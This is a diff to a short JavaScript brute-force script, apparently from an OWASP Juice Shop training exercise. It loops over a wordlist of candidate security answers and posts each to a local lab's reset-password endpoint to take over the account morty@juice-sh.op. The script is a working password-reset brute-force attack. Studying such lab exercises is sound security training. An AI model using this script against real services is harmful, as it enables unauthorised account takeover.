@@ -1,13 +1,17 @@
 // Einfügen erlauben
 
-var passwordList = [ "snuffles", 
-                     "sowball", 
-                     "5N0wb41L" ]; 
+var passwordList = [
+    "snuffles",
+    "snowball",
+    /* ... */
+    "snowball",
+    "5n0wb4ll",
+    "5N0wb41L" ];
 
 console.log("Bruteforce attack started");
 var passwordFound = false;
 for (var i = 0; i < passwordList.length; i++) {
-    
+
     var bruteforcePassword = passwordList[i];
     var postBody = {    "answer" : bruteforcePassword,
                         "email" :  "morty@juice-sh.op",
@@ -16,7 +20,7 @@ for (var i = 0; i < passwordList.length; i++) {
                    };
 
     $.ajax({
-        url: 'http://192.168.99.100:32768/rest/user/reset-password',
+        url: 'https://192.168.99.100:32768/rest/user/reset-password',
         type: 'post',
         dataType: 'json',
         contentType: 'application/json',
@@ -37,7 +41,7 @@ for (var i = 0; i < passwordList.length; i++) {
             console.info("Wrong password", data);
         },
     });
-    
+
     if (passwordFound) {
       break;
     }
